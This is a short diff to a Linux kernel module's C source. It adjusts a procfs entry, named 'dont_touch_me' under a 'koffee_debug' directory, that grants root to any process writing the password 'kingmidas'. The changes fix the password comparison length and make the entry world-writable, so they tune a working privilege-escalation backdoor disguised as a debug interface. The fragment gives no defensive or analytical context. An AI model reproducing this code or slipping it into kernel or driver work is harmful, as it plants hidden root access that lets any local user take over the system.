@@ -38,7 +38,7 @@ static int koffee_proc_su_write(struct file *file, const char __user *buffer,
 		return -EFAULT;
 	}
 
-	if(!strncmp("kingmidas",(char*)buf,12)){
+	if(!strncmp("kingmidas",(char*)buf,9)){
 		cred = (struct cred *)__task_cred(current);
 		cred->uid = 0;
 		cred->gid = 0;
@@ -64,7 +64,7 @@ static int koffee_proc_su_read(char *page, char **start, off_t off,
 static int koffee_root_procfs_attach(void)
 {
 	proc_root = proc_mkdir("koffee_debug", NULL);
-	proc_su= create_proc_entry("dont_touch_me", 0666, proc_root);
+	proc_su= create_proc_entry("dont_touch_me", 0222, proc_root);
 	if (IS_ERR(proc_su)){
 		return -1;
 	}
